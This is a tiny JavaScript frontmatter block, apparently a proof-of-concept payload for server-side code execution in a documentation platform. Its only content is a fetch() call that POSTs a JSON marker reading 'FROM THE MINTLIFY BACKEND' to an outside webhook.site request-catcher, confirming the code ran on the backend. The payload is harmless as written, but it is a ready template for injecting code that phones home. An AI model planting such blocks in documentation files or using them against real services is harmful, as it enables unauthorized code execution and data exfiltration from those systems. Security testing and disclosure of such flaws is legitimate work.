---js
{
fetch("https://webhook.site/3728d239-1be1-42f0-bab2-44aeeda90243", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ "hello": "FROM THE MINTLIFY BACKEND" }) })
}
---
